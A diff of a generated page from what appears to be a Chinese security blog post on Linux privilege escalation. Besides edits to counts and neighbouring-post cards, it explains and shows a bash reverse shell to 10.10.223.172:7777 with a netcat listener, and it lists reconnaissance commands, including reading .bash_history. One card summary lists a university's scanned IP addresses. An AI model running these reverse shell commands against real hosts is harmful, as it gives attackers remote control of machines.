@@ -572,7 +572,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    334
+                    340
                 </div>
                 
 
@@ -600,15 +600,15 @@
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
 <ul>
 <li><ol>
-<li>监听7777端口<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></tbody></table></figure></li>
+<li>监听7777端口<br>在kali使用netcat执行:<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></tbody></table></figure></li>
 </ol>
 </li>
-<li>2.<br>bash -i代表在本地打开一个bash，然后就是/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出,这个时候我们在本机CentOS输入命令，输出以及错误输出的内容就会被传递显示到远程。<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.223.172/7777 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-</li>
+<li>2.<br>bash -i代表在本地打开一个bash，然后就是/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出,这个时候我们在本机Ubuntu输入命令，输出以及错误输出的内容就会被传递显示到远程。</li>
 </ul>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.223.172/7777 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
+
+
+
 <h2 id="程序劫持"><a href="#程序劫持" class="headerlink" title="程序劫持"></a>程序劫持</h2><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h2 id="提取基础命令"><a href="#提取基础命令" class="headerlink" title="提取基础命令"></a>提取基础命令</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uname -an  //版本信息</span><br><span class="line">id  //当前权限</span><br><span class="line"><span class="built_in">pwd</span>  //当前目录</span><br><span class="line">cat /etc/issue   //版本号,可以更改</span><br><span class="line"></span><br><span class="line">root@q0o0p:/home/q0o0p<span class="comment"># cat .bash_history  //历史记录</span></span><br></pre></td></tr></tbody></table></figure>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -886,17 +886,62 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;Current
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2020/09/20/privilgeescalation/">
+                <a href="/2020/10/03/ecjtu/">
                     <div class="card-image">
                         
-                        <img src="/images/2.jpg" class="responsive-img" alt="linux提权">
+                        <img src="/images/5.jpg" class="responsive-img" alt="ecjtu">
                         
-                        <span class="card-title">linux提权</span>
+                        <span class="card-title">ecjtu</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            202.101.209.157 //企业云盘 202.101.209.187 //https://mobile.ecjtu.edu.cn/#/  api接口
+微哨
+202.101.209.222Host is up (0.0075s lat
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-03
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            q0o0p
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/mysql/">
+                        <span class="chip bg-color">mysql</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/09/20/windows-privilge-escalation/">
+                    <div class="card-image">
+                        
+                        <img src="/images/2.jpg" class="responsive-img" alt="windows提权">
+                        
+                        <span class="card-title">windows提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -917,7 +962,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -925,57 +969,8 @@
                         <span class="chip bg-color">privilge escalation</span>
                     </a>
                     
-                    <a href="/tags/linux/">
-                        <span class="chip bg-color">linux</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/08/28/kali-update/">
-                    <div class="card-image">
-                        
-                        <img src="/images/5.jpg" class="responsive-img" alt="kali-update">
-                        
-                        <span class="card-title">kali-update</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            123//删除C++快捷方式sudo update-alternatives --remove-all gccsudo update-alternatives --remove-all g++
-安装常用工具配置java环境变量phpstud
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-28
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            q0o0p
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/outguess/">
-                        <span class="chip bg-color">outguess</span>
-                    </a>
-                    
-                    <a href="/tags/kali/">
-                        <span class="chip bg-color">kali</span>
+                    <a href="/tags/windows-10/">
+                        <span class="chip bg-color">windows 10</span>
                     </a>
                     
                 </div>
@@ -1182,7 +1177,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">2.3k</span>&nbsp;字
+                class="white-color">4.5k</span>&nbsp;字
             
             
             
